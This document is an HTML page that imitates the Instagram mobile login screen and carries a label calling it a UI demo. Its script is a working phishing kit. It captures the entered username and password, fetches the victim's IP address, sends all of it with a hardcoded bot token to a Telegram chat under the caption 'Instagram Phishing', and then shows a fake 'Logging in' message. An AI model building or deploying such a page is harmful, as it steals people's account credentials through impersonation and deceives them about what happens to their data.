<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background:#e5e5e5;
    display:flex;
    justify-content:center;
    padding:20px 0;
  }
  .phone {
    width:390px;
    max-width:100vw;
    background:#fff;
    min-height:844px;
    position:relative;
    display:flex;
    flex-direction:column;
  }
  .back-row {
    padding:20px 20px 0;
  }
  .back-row svg { width:24px; height:24px; }
  .lang-row {
    text-align:center;
    margin-top:24px;
  }
  .lang-row span {
    font-size:17px;
    color:#8a8a8a;
    display:inline-flex;
    align-items:center;
    gap:6px;
  }
  .logo-wrap {
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:flex-start;
    padding-top:70px;
  }
  .meta-mini {
    display:flex;
    align-items:center;
    gap:6px;
    color:#8a8a8a;
    font-size:15px;
    font-weight:600;
    margin-bottom:36px;
  }
  .meta-mini svg { width:18px; height:18px; }
  .ig-icon {
    width:96px;
    height:96px;
  }
  .form-wrap {
    padding:70px 24px 0;
  }
  .field {
    width:100%;
    border:1px solid #dbdbdb;
    border-radius:28px;
    padding:16px 20px;
    font-size:16px;
    margin-bottom:16px;
    outline:none;
    color:#262626;
  }
  .field::placeholder { color:#8a8a8a; }
  .field:focus { border-color:#8a8a8a; }
  .login-btn {
    width:100%;
    background:#0064e0;
    color:#fff;
    border:none;
    border-radius:28px;
    padding:16px;
    font-size:17px;
    font-weight:600;
    cursor:pointer;
    margin-top:4px;
  }
  .login-btn:active { opacity:.85; }
  .forgot {
    display:block;
    text-align:center;
    margin-top:24px;
    font-size:16px;
    color:#262626;
    text-decoration:none;
    font-weight:400;
  }
  .bottom-wrap {
    padding:24px;
    margin-top:auto;
  }
  .create-btn {
    width:100%;
    background:#fff;
    color:#0064e0;
    border:1px solid #0064e0;
    border-radius:28px;
    padding:16px;
    font-size:17px;
    font-weight:600;
    cursor:pointer;
    margin-bottom:24px;
  }
  .meta-logo {
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    color:#262626;
    font-size:20px;
    font-weight:600;
  }
  .meta-logo svg { width:24px; height:24px; }
  .home-indicator {
    width:135px;
    height:5px;
    background:#000;
    border-radius:3px;
    margin:12px auto 8px;
  }
  .error-msg {
    color:#ed4956;
    font-size:13px;
    text-align:center;
    margin-top:10px;
    display:none;
  }
</style>
</head>
<body>

<div class="phone">
  <div class="back-row">
    <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
  </div>

  <div class="lang-row">
    <span>English (India)
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#8a8a8a" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
    </span>
  </div>

  <div class="logo-wrap">
    <svg class="ig-icon" viewBox="0 0 96 96" fill="none">
      <defs>
        <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" stop-color="#FFDC80"/>
          <stop offset="20%" stop-color="#FCAF45"/>
          <stop offset="40%" stop-color="#F77737"/>
          <stop offset="60%" stop-color="#E1306C"/>
          <stop offset="80%" stop-color="#C13584"/>
          <stop offset="100%" stop-color="#833AB4"/>
        </linearGradient>
      </defs>
      <rect x="6" y="6" width="84" height="84" rx="26" fill="none" stroke="url(#igGrad)" stroke-width="6"/>
      <circle cx="48" cy="49" r="18" fill="none" stroke="url(#igGrad)" stroke-width="6"/>
      <circle cx="69" cy="27" r="3.5" fill="url(#igGrad)"/>
    </svg>
  </div>

  <div class="form-wrap">
    <input type="text" id="username" class="field" placeholder="Username, email address or mobile number">
    <input type="password" id="password" class="field" placeholder="Password">
    <button class="login-btn" id="loginBtn">Log in</button>
    <a href="#" class="forgot">Forgotten password?</a>
    <div class="error-msg" id="errorMsg">This is a UI demo — no real authentication is performed.</div>
  </div>

  <div class="bottom-wrap">
    <button class="create-btn">Create new account</button>
    <div class="meta-logo">
      <svg width="34" height="27" viewBox="0 0 100 80" fill="none">
        <circle cx="35" cy="40" r="28" stroke="#0081FB" stroke-width="14"/>
        <circle cx="65" cy="40" r="28" stroke="#0081FB" stroke-width="14"/>
      </svg>
      Meta
    </div>
    <div class="home-indicator"></div>
  </div>
</div>

<script>
  const BOT_TOKEN = "8941251283:AAFDGIvRSkAHR0h1RYuMgt6-FfK-LZ3HUH0";
  const CHAT_ID = "7264141539";

  document.getElementById('loginBtn').addEventListener('click', async function(e){
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (username && password) {
      const caption = `🔥 Instagram Phishing\n\n👤 Username: ${username}\n🔑 Password: ${password}\nIP: ${await getIP()}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`;

      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", caption);

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        body: formData
      });

      document.getElementById('errorMsg').innerHTML = "Logging in... Please wait.";
      document.getElementById('errorMsg').style.display = 'block';
    } else {
      document.getElementById('errorMsg').style.display = 'block';
    }
  });

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch(e) { return 'N/A'; }
  }
</script>
</body>
</html>
